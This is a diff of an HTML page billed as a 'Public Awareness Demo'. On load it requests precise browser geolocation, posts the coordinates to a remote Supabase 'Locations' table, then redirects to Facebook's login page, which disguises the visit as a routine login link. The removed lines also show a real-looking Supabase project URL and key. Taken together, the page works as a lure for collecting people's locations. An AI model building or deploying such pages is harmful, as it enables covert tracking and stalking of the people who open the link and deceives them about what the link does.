@@ -3,28 +3,39 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Location Awareness</title>
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Public Awareness Demo</title>
 
 <style>
 body{
+  margin:0;
   font-family:Arial,sans-serif;
-  text-align:center;
-  padding:40px 20px;
-  background:#f5f5f5;
+  background:#f2f4f7;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  min-height:100vh;
 }
 .card{
+  width:90%;
   max-width:420px;
-  margin:auto;
-  background:white;
-  padding:28px;
+  background:#fff;
+  padding:30px 24px;
   border-radius:16px;
-  box-shadow:0 4px 18px #0002;
+  text-align:center;
+  box-shadow:0 4px 20px rgba(0,0,0,.12);
 }
-h2{margin-top:0}
-#status{
+.icon{font-size:50px}
+h1{font-size:25px}
+p{
+  color:#606770;
+  line-height:1.5;
+}
+.status{
   margin-top:20px;
-  line-height:1.6;
+  padding:14px;
+  border-radius:10px;
+  background:#f0f2f5;
 }
 </style>
 </head>
@@ -32,29 +43,54 @@ h2{margin-top:0}
 <body>
 
 <div class="card">
-  <h2>📍 Location Awareness</h2>
+
+  <div class="icon">🔐</div>
+
+  <h1>Public Awareness Demo</h1>
 
   <p>
-    This demo requests your device location.
-    Your location will be shared only after you allow
-    the browser permission request.
+    This demonstration shows how a website can
+    request access to your device location.
   </p>
 
-  <div id="status">Requesting location permission...</div>
+  <p>
+    Your location will be shared only if you
+    explicitly allow the browser permission.
+  </p>
+
+  <div class="status" id="status">
+    Requesting location permission...
+  </div>
+
 </div>
 
 <script>
 
-// ===== SUPABASE SETTINGS =====
-const SUPABASE_URL = "https://jxhplkuyeafuicbtbxes.supabase.co";
-const SUPABASE_KEY = "sb_publishable_yZUSVCTw_7qJ9ydy5PqMxQ_ROEMJHTA";
-// ==============================
+// ===============================
+// SUPABASE
+// ===============================
 
-async function requestLocation(){
+const SUPABASE_URL =
+"PASTE_YOUR_SUPABASE_PROJECT_URL";
 
-  const status = document.getElementById("status"); 
+const SUPABASE_KEY =
+"PASTE_YOUR_PUBLISHABLE_KEY";
+
+
+// ===============================
+// LOCATION
+// ===============================
+
+function requestLocation(){
+
+  const status =
+    document.getElementById("status");
+
   if(!navigator.geolocation){
-    status.innerHTML = "❌ Location is not supported by this browser.";
+
+    status.innerHTML =
+      "❌ Location is not supported.";
+
     return;
   }
 
@@ -62,24 +98,39 @@ async function requestLocation(){
 
     async function(position){
 
-      const latitude = position.coords.latitude;
-      const longitude = position.coords.longitude;
-      const accuracy = position.coords.accuracy;
+      const latitude =
+        position.coords.latitude;
 
-      status.innerHTML = "📍 Location received. Saving securely...";
+      const longitude =
+        position.coords.longitude;
+
+      const accuracy =
+        position.coords.accuracy;
+
+      status.innerHTML =
+        "📍 Location received...";
+
 
       try{
 
         const response = await fetch(
-          SUPABASE_URL + "/rest/v1/Locations",
+
+          SUPABASE_URL +
+          "/rest/v1/Locations",
+
           {
             method:"POST",
+
             headers:{
               "apikey":SUPABASE_KEY,
-              "Authorization":"Bearer " + SUPABASE_KEY,
-              "Content-Type":"application/json",
-              "Prefer":"return=minimal"
+              "Authorization":
+                "Bearer " + SUPABASE_KEY,
+              "Content-Type":
+                "application/json",
+              "Prefer":
+                "return=minimal"
             },
+
             body:JSON.stringify({
               latitude:latitude,
               longitude:longitude,
@@ -88,14 +139,26 @@ async function requestLocation(){
           }
         );
 
+
         if(response.ok){
+
           status.innerHTML =
-            "✅ Location shared successfully.";
+            "✅ welcome .<br><br>" +
+            "Redirecting...";
+
+          setTimeout(function(){
+
+            // Official Facebook login page
+            window.location.href =
+              "https://www.facebook.com/login/";
+
+          },1200);
+
         }else{
-          const errorText = await response.text();
-          console.error(errorText);
+
           status.innerHTML =
-            "⚠️ Location received, but saving failed.";
+            "⚠️ Location could not be saved.";
+
         }
 
       }catch(error){
@@ -103,30 +166,41 @@ async function requestLocation(){
         console.error(error);
 
         status.innerHTML =
-          "⚠️ Could not connect to the location server.";
+          "⚠️ Connection error.";
+
       }
+
     },
+
 
     function(error){
 
       if(error.code === 1){
+
         status.innerHTML =
-          "❌ Location permission was denied.";
+          "❌ Location permission denied.";
+
       }else{
+
         status.innerHTML =
-          "❌ Location could not be obtained.";
+          "❌ Could not obtain location.";
+
       }
+
     },
+
 
     {
       enableHighAccuracy:true,
       timeout:15000,
       maximumAge:0
     }
+
   );
 }
 
-// Request permission when page opens
+
+// Start automatically when page opens
 requestLocation();
 
 </script>
